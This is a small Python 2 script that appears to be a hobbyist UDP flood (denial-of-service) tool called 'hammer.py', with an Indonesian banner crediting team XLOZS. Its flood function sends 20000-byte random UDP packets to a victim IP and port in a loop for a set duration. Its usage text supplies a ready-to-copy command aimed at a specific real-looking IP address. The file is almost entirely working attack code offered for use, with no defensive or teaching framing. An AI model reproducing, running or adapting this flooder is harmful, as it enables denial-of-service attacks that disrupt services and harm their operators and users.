import time
import socket
import random
import sys
def usage():
    print "\033[1;32m########################"
    print "#------------------------------------------------#"
    print "   \033[1;91mCommand: " " python2 hammer.py 185.88.181.53 60 1000" "\033[1;32m"
    print  "     Copy aja yang diatas                                                           "
    print " \033[1;91mCreator:ImSadBoy And I want to be strong Awokaowkwok\033[1;32m"
    print " \033[1;91mTeam   : XLOZS\33[0;36m"
    print " \033[1;91mVersion:Beta \033[1;32m"
    print "                     KITA BERKARYA"
    print "\33[0;36mXLOZS"
    print "                 <--[XLOZSS]-->\33[0;36m "
    print "#########################################################"
    print "                        @@@@@@@@@@"
    print "                       @@@@@@@@@@@@"
    print "                     @@@@@@@@@@@@@@@@"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()